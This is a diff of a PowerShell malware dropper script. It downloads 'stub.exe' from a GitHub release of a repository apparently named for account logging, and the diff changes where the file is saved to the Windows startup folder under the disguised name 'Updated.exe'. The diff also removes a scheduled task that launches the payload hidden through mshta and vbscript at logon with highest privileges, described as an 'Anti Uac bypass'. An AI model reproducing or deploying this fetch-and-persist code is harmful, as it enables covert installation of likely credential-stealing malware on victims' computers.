@@ -18,17 +18,10 @@ Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $ta
 
 
 $url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/stub.exe"
-$output = "$dir\UAC.exe"
+$output = "$startupfolder\Updated.exe"
 
 if (Test-Path -Path $output) {
     Write-Host "hello"
 } else {
     Invoke-WebRequest -Uri $url -OutFile $output
 }
-
-
-$task_name = "UserUacControl"
-$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"$output`",0)(window.close)"
-$task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Anti Uac bypass" -RunLevel Highest -Force
